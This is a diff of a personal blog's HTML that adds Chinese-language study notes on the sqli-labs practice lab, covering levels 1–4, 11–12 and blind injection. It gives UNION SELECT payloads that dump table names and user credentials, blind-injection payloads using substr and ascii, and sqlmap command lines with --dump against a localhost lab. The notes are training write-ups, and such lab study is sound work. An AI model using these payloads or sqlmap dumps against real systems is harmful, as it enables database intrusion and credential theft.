@@ -71,6 +71,275 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-11" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/24/page-11/" class="article-date">
+  <time class="dt-published" datetime="2021-01-24T09:35:33.000Z" itemprop="datePublished">2021-01-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/24/page-11/">page十一关手动注入 十二也可以</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>先判断注入类型 </p>
+<p>用火狐下载个插件hackbar </p>
+<p>然后 post data那边输入 uname=admin（这个后面输入一个符号之类的判断注入类型）#&amp;passwd=admin&amp;submit=Submit （十二关是双引号 就加上“））</p>
+<p>这关的就有提示单引号注入 那么uname=admin’ #&amp;passwd=admin&amp;submit=Submit 输入这段</p>
+<p>登陆成功  然后uname=admin’  order by 2（这个数字可以慢慢试看到多少的时候显示登陆错误）#&amp;passwd=admin&amp;submit=Submit 这个是用来的出显示位数的</p>
+<p>接下来使用联合查询语句 union select 来进行爆破，使用union select的时候要注意，输入的unname必须是一个不存在的，，否则将会输出不出来</p>
+<p>uname=aaa’ union select 1,2#&amp;passwd=admin&amp;submit=Submit 比如这样子</p>
+<p>uname=aaa’ union select user(),version() #&amp;passwd=admin&amp;submit=Submit这句爆出使用者和数据库版本</p>
+<p>之后操作就和第一关是一样的都是那些语句</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/24/page-11/" data-id="ckroqtflb0003yww7buy05dbt" data-title="page十一关手动注入 十二也可以" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-9" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/22/page-9/" class="article-date">
+  <time class="dt-published" datetime="2021-01-22T12:27:10.000Z" itemprop="datePublished">2021-01-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/22/page-9/">sqlmap抓包功能</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>a老样子 win+r cmd sqlmap.py -u “想抓哪关的包的地址例如：<a target="_blank" rel="noopener" href="http://localhost/sqli-labs/Less-11/&quot;">http://localhost/sqli-labs/Less-11/&quot;</a> –forms  –thread 10 -dbs  </p>
+<p>这个会出现一句话例如这样Edit POST data [default: uname=&amp;passwd=&amp;submit=Submit] (Warning: blank fields detected):</p>
+<p>按照上面的要求就在后面输入 uname=aaa（随便）&amp;passwd=aaa（随便）&amp;submit=Submit</p>
+<p>也可选择默认方式后面加个–batch</p>
+<p>这速度也挺快的</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/22/page-9/" data-id="ckroqtfma001nyww75ih4fdm7" data-title="sqlmap抓包功能" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-8" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/20/page-8/" class="article-date">
+  <time class="dt-published" datetime="2021-01-20T06:43:56.000Z" itemprop="datePublished">2021-01-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/20/page-8/">page less 11-20</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>a到十一这些都是post型的可用sqlmap 粗暴的方式解题 用火狐打开 然后f12选择网络那个选项里头的有个post那项右键复制请求头</p>
+<p> 然后随便生成一个文本文档粘贴进去 </p>
+<p>再在网页那边随便输入用户名密码 </p>
+<p>再次复制 这次复制post数据像这样子的uname=aaa&amp;passwd&amp;submit=Submit//&amp;这个符号要自己加</p>
+<p>之后win+r cmd sqlmap.py -r “刚才那个文本文档的地址\mingzi.txt” –current-db –batch </p>
+<p>爆出当前数据库 之后sqlmap.py -r “刚才那个文本文档的地址\mingzi.txt” -D 库名 –tables –batch</p>
+<p>库名表明 爆表名字是需要 -C 表明 –dump 加上个dump </p>
+<p>ps 如果觉得速度慢点话加个 –thread 10 有的关如果爆不出来提高level  –level 2-5选一个</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/20/page-8/" data-id="ckroqtfm9001myww78r3n2c4m" data-title="page less 11-20" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-5" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/11/25/page-5/" class="article-date">
+  <time class="dt-published" datetime="2020-11-25T12:28:10.000Z" itemprop="datePublished">2020-11-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/11/25/page-5/">盲注</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>?id=1’ and length(database())=n %23 n从0到无穷大 猜出数据库长度 </p>
+<p>?id=1’ and left(database(),1)&gt;’<em><strong>a</strong></em>‘–+ 猜数据库首字母 显示you are in 表示该字母还在输入的字母后假设输入一个显示you are in的下一个什么都没显示 则为此 第二第三位一次猜下去（猜库名）</p>
+<ul>
+<li>利用substr() ascii()函数进行尝试</li>
+</ul>
+<p>?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <strong>0</strong>,1),<em><strong>1</strong></em>,1))&gt;<strong>100</strong>–+  加黑数字更改 此为ascii码对照数字对应字母 也是和猜库名一样的操作  这猜第一个库的第一个字符   然后一个一个改 猜出第n个库的第n个字符</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/25/page-5/" data-id="ckroqtflt000vyww77bjcaogn" data-title="盲注" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-4" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/11/19/page-4/" class="article-date">
+  <time class="dt-published" datetime="2020-11-19T15:23:35.000Z" itemprop="datePublished">2020-11-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/11/19/page-4/">sqli-labs</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>前两关</p>
+<p>输入？id=1和？id=2 和？id=2-1</p>
+<p>若2-1的结果和2一样则为字符型 若2-1 和1的结果一样则为数字型</p>
+<p>然后<em>确认字段位数</em> order by 数字一个个试看哪个报错就可确认其为n-1位</p>
+<p><em>确认占位信息</em>    ？id=-1 union select 1，<em>2，3 –+</em></p>
+<p><em>找库名</em>    ？id=-1 union select 1，2，database（）2之后的便是库名</p>
+<p><em>找表名</em>   ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+ </p>
+<p><em>找字段名</em>   ?id=-1 union select 1,2,group_concat(column_name) from information_schema.COLUMNs where table_schema=’security’ and table_name=’users’–+</p>
+<p><em>找账号密码</em>  ?id=-1 union select 1,2,group_concat(concat_ws(‘,’,username,password) SEPARATOR ‘|’) from users –+</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/19/page-4/" data-id="ckroqtflq000pyww7gg5phpxb" data-title="sqli-labs" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/11/19/page-3/" class="article-date">
+  <time class="dt-published" datetime="2020-11-19T15:07:41.000Z" itemprop="datePublished">2020-11-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/11/19/page-3/">less 3</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</p>
+<p>输入单引号，根据报错信息确定咱们输入的内容存放到一对单引号加圆括号中了，猜想一下咱们输入1在数据库语句中的位置，形如select … from … where id=(‘1’) …，在第一题中id=1‘的后面单引号加上），其它保持不变就行了</p>
+<p>Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</p>
+<p>输入单引号页面无变化 双引号页面报错 据报错信息判断出咱们输入的内容被放到一队双引号和圆括号中， 猜想一下：select … from … where id=(”1”) …，把第一题中1后面的引号换成双引号加）就可以了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/19/page-3/" data-id="ckroqtflm000iyww7gvkz263a" data-title="less 3" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Eclipse for PHP+Wampserver搭建PHP开发环境" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/11/07/Eclipse%20for%20PHP+Wampserver%E6%90%AD%E5%BB%BAPHP%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/" class="article-date">
@@ -408,23 +677,23 @@ echo "Have a good night!";
       <ul>
         
           <li>
-            <a href="/2021/07/29/page-81/">BJDCTF2020EasySearch</a>
+            <a href="/2021/07/29/page-87/">GWCTF 2019枯燥的抽奖</a>
           </li>
         
           <li>
-            <a href="/2021/07/29/page-80/">CISCN2019 华东南赛区Web11</a>
+            <a href="/2021/07/29/page-86/">CISCN2019 华北赛区 Day1 Web1Dropbox</a>
           </li>
         
           <li>
-            <a href="/2021/07/21/page-79/">MRCTF2020Ezpop</a>
+            <a href="/2021/07/29/page-85/">极客大挑战 2019RCE ME</a>
           </li>
         
           <li>
-            <a href="/2021/07/21/page-78/">NPUCTF2020ReadlezPHP</a>
+            <a href="/2021/07/29/page-84/">CISCN2019 华北赛区 Day1 Web2ikun</a>
           </li>
         
           <li>
-            <a href="/2021/07/21/page-77/">网鼎杯 2020 朱雀组Nmap</a>
+            <a href="/2021/07/29/page-83/">MRCTF2020套娃</a>
           </li>
         
       </ul>
